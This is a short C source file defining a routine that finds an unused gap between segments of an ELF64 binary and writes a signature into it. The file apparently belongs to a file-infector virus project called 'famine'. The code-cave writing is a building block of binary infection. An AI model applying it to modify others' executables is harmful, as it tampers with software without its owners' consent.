#include "famine.h"

#include <stdint.h> // uintX_t, UINT64_MAX
#include <string.h> // memcpy()

int sign_elf64_cavity(t_file *file, t_elf64 *elf64)
{
	uint64_t cave_start, cave_end;

	for (uint32_t i = 0; i < elf64->ehdr->e_phnum; i++) {
		if (elf64->phdr[i].p_offset > file->size)
			continue ;
		if (elf64->phdr[i].p_filesz > file->size - elf64->phdr[i].p_offset)
			continue ;

		cave_start = elf64->phdr[i].p_offset + elf64->phdr[i].p_filesz;
		cave_end = elf64_find_next_segment(elf64->phdr, elf64->ehdr->e_phnum, i);

		if (cave_end == UINT64_MAX)
			continue ;
		if (cave_end <= cave_start)
			continue ;
		if (cave_end - cave_start < SIGNATURE_SIZE)
			continue ;
		if (SIGNATURE_SIZE > file->size - cave_start)
			continue ;

		memcpy(file->map + cave_start, SIGNATURE, SIGNATURE_SIZE);
		return (0);
	}
	return (1);
}
